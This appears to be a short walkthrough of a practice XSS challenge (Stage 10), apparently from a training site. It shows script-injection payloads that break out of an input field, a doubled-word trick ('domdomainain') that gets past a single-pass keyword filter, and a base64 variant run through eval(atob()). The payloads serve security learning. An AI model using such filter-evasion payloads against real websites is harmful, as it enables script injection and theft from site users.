# **XSS Challenges Stage 10**

Insert Stage 2 payload again.

`"><script>alert(document.domain);</script><a style="`

Then you will see this in source code.

```
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=""><script>alert(document.);</script><a style=""> 
```

The code `domain` is miss. It means the whole word has been replaced.

Here's come up a common trick. This trick can pass the replaceing technism which just check for once.

Use the word which will be replaced to seperate the word itself.

Like `domain` becomes `domdomainain`.

Let's insert our new payload:

`"><script>alert(document.domdomainain);</script><a style="`

![](https://i.imgur.com/GDn9607.png)

**※Here's another method more technical.**

With this post, Stack Overflow question [Base64 encoding and decoding in client-side Javascript](http://stackoverflow.com/q/2820249/595990) we find that `atob()` can use to decode Base64 strings(`btoa()` to encode).

After decode, it's still a string, to become a line of Javascript code, you need [eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval).

We simply encode the `alert(document.domain);` and put it into `<script>` after wrap up by `eval()` and `atob()` .

```
"><script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));</script>
```


